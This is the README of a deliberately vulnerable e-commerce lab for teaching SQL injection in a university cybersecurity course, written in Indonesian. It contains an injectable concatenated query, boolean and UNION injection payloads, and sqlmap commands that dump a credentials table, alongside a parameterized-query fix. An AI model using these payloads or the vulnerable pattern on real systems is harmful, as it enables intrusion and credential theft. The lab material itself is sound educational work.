# SnowCommerce - E-Commerce Cyber Security Course

![Next.js](https://img.shields.io/badge/Next.js-14-black)
![TypeScript](https://img.shields.io/badge/TypeScript-5.3-blue)
![Tailwind CSS](https://img.shields.io/badge/Tailwind-3.4-38bdf8)
![SQLite](https://img.shields.io/badge/SQLite-3-003B57)

E-commerce website minimalis dengan tema **Snow White** yang **sengaja dibuat vulnerable** terhadap SQL Injection untuk keperluan praktikum Keamanan Siber.

##  Quick Start

### git clone 

### 1. Install Dependencies

```bash
pnpm install
```

### 2. Initialize Database

```bash
pnpm run init-db
```

Output yang diharapkan:
```
🔧 Memulai inisialisasi database...
✅ Tabel products berhasil dibuat
✅ Tabel admin_credentials berhasil dibuat (target eksploitasi)
✅ Data produk sample berhasil diinsert
✅ Data admin_credentials berhasil diinsert (berisi flag untuk praktikum)

🎉 Database berhasil diinisialisasi!
📁 Lokasi: ecommerce.db

⚠️  PERINGATAN KEAMANAN:
   Tabel admin_credentials berisi data sensitif untuk praktikum SQL Injection
   API endpoint /api/check-product sengaja dibuat vulnerable
   Gunakan sqlmap untuk testing: sqlmap -u "http://localhost:3000/api/check-product?id=1"
```

### 3. Run Development Server

```bash
pnpm dev
```

Buka [http://localhost:3000](http://localhost:3000) di browser.

## 🔴 SQL Injection Testing

### Vulnerable Endpoint

```
GET /api/check-product?id=1
```

Endpoint ini **SENGAJA VULNERABLE** karena:
```typescript
// ⚠️ VULNERABLE CODE
const query = "SELECT * FROM products WHERE id = " + id;
```

### Manual Testing

1. **Normal Request**
   ```
   http://localhost:3000/api/check-product?id=1
   ```

2. **Boolean-based Attack**
   ```
   http://localhost:3000/api/check-product?id=1 OR 1=1--
   ```

3. **UNION-based Attack**
   ```
   http://localhost:3000/api/check-product?id=1 UNION SELECT id,username,password,email,role,secret_key,created_at FROM admin_credentials--
   ```

### Testing dengan sqlmap

#### Basic Scan
```bash
sqlmap -u "http://localhost:3000/api/check-product?id=1"
```

#### Dump Semua Database
```bash
sqlmap -u "http://localhost:3000/api/check-product?id=1" --batch --dump
```

#### Dump Tabel Spesifik
```bash
sqlmap -u "http://localhost:3000/api/check-product?id=1" --batch -D main -T admin_credentials --dump
```

#### Extract Columns Tertentu
```bash
sqlmap -u "http://localhost:3000/api/check-product?id=1" --batch -D main -T admin_credentials -C username,password,secret_key --dump
```

## 🗂️ Struktur Database

### Tabel: products
| Column | Type | Description |
|--------|------|-------------|
| id | INTEGER | Primary Key |
| name | TEXT | Nama produk |
| description | TEXT | Deskripsi produk |
| price | REAL | Harga |
| category | TEXT | Kategori |
| stock | INTEGER | Stok |
| image_url | TEXT | URL gambar |
| created_at | DATETIME | Timestamp |

### Tabel: admin_credentials (🎯 TARGET)
| Column | Type | Description |
|--------|------|-------------|
| id | INTEGER | Primary Key |
| username | TEXT | Username admin |
| password | TEXT | Password (plaintext) |
| email | TEXT | Email |
| role | TEXT | Role (superadmin/manager/staff) |
| secret_key | TEXT | **FLAG untuk praktikum** |
| created_at | DATETIME | Timestamp |

### Sample Data di admin_credentials

| username | password | secret_key |
|----------|----------|------------|
| admin | SuperSecretPassword123! | FLAG{SQL_INJ3CT10N_VULN3R4BL3_2026} |
| manager | Manager@2026 | MNG-KEY-9876543210 |
| staff | StaffAccess2026 | STAFF-TOKEN-ABC123XYZ |

## 📁 Struktur Folder

```
.
├── app/
│   ├── api/
│   │   ├── check-product/        # 🔴 Vulnerable endpoint
│   │   │   └── route.ts
│   │   └── products/             # ✅ Secure endpoint
│   │       ├── route.ts
│   │       └── [id]/
│   │           └── route.ts
│   ├── products/
│   │   └── [id]/
│   │       └── page.tsx          # Halaman detail produk dinamis
│   ├── layout.tsx                # Root layout dengan Glassmorphism navbar
│   ├── page.tsx                  # Halaman katalog produk (root)
│   └── globals.css               # Global styles
├── lib/
│   └── db.ts                     # Database connection & helpers
├── scripts/
│   └── init-db.js                # Database initialization script
├── ecommerce.db                  # SQLite database (generated)
├── package.json
├── next.config.js
├── tailwind.config.js
├── tsconfig.json
└── README.md
```

## 🎨 Design Features

### Snow White Theme
- Background: Pure white (`#ffffff`)
- Accent: Soft gray (`#fafafa`, `#f5f5f5`)
- Text: Dark gray untuk high contrast
- Border: Subtle gray borders

### Glassmorphism Effect
```css
.glass {
  background: rgba(255, 255, 255, 0.7);
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 255, 255, 0.3);
}
```

### Interactive Elements
- Hover scale pada product cards: `hover:scale-105`
- Smooth transitions: `transition-all duration-300`
- Shadow pada hover: `hover:shadow-xl`

## 🔒 Perbandingan Secure vs Vulnerable

### ❌ Vulnerable (check-product endpoint)
```typescript
// JANGAN LAKUKAN INI!
const id = request.nextUrl.searchParams.get('id');
const query = "SELECT * FROM products WHERE id = " + id;
const results = await vulnerableQuery(query);
```

### ✅ Secure (products endpoint)
```typescript
// LAKUKAN INI!
const product = await safeQueryOne(
  'SELECT * FROM products WHERE id = ?',
  [id]
);
```

## 📚 Skenario Praktikum

### Langkah 1: Identifikasi Vulnerability
1. Browse website di `http://localhost:3000`
2. Klik link "🔴 Vulnerable API" di navbar
3. Perhatikan response JSON yang menampilkan query SQL

### Langkah 2: Manual Exploitation
1. Coba payload: `?id=1 OR 1=1--`
2. Lihat semua produk ter-return
3. Coba UNION attack untuk akses tabel lain

### Langkah 3: Automated Testing dengan sqlmap
1. Install sqlmap
2. Run basic scan
3. Dump database
4. Extract admin_credentials
5. Dapatkan FLAG dari kolom secret_key

### Langkah 4: Remediation
1. Lihat kode di `/api/products/[id]/route.ts` (secure version)
2. Bandingkan dengan `/api/check-product/route.ts`
3. Pahami penggunaan prepared statements
4. Dokumentasikan findings

## 🛠️ Tech Stack

- **Framework**: Next.js 14 (App Router)
- **Language**: TypeScript
- **Styling**: Tailwind CSS
- **Database**: SQLite (sqlite3)
- **Package Manager**: pnpm

## 📝 Notes untuk Praktikum

1. **Database Reset**: Hapus `ecommerce.db` dan jalankan `pnpm run init-db` untuk reset
2. **Port**: Default di 3000, bisa diubah dengan `PORT=3001 pnpm dev`
3. **Logging**: SQL queries di-log ke console untuk debugging
4. **Testing**: Gunakan Postman/curl untuk test API secara manual

## 🎓 Learning Objectives

Setelah praktikum ini, mahasiswa diharapkan:
- ✅ Memahami konsep SQL Injection
- ✅ Dapat mengidentifikasi vulnerable code
- ✅ Dapat melakukan exploitation menggunakan sqlmap
- ✅ Memahami cara mitigasi dengan prepared statements
- ✅ Aware terhadap security best practices

## ⚠️ Disclaimer

Project ini dibuat **KHUSUS UNTUK KEPERLUAN EDUKASI** dalam mata kuliah Keamanan Siber. Vulnerability yang ada adalah **DISENGAJA** untuk tujuan pembelajaran.

**JANGAN:**
- ❌ Deploy ke internet/production
- ❌ Gunakan pattern vulnerable di aplikasi real
- ❌ Share credentials atau database yang berisi data sensitif real

**SELALU:**
- ✅ Gunakan prepared statements/parameterized queries
- ✅ Validate dan sanitize semua user input
- ✅ Implement proper authentication & authorization
- ✅ Follow security best practices

## 📄 License

MIT License - For Educational Purposes Only

---

**Dibuat untuk Praktikum Keamanan Siber**  
Semester 4 - 2026

Happy Learning! 🎓🔒
